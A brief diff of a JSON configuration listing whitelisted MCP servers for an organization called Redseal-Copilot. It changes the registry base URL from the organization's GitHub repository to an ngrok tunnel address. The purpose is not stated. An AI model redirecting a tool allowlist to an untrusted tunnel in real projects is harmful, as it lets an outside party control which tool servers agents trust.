@@ -2,6 +2,6 @@
   "version": "1.0",
   "organization": "Redseal-Copilot",
   "description": "Whitelisted MCP servers for Redseal-Copilot organization",
-  "registryBaseUrl": "https://raw.githubusercontent.com/Redseal-Copilot/.github/main/registry/v0.1/servers"
+  "registryBaseUrl": "https://molecule-startling-disinfect.ngrok-free.dev"
 }
 ``
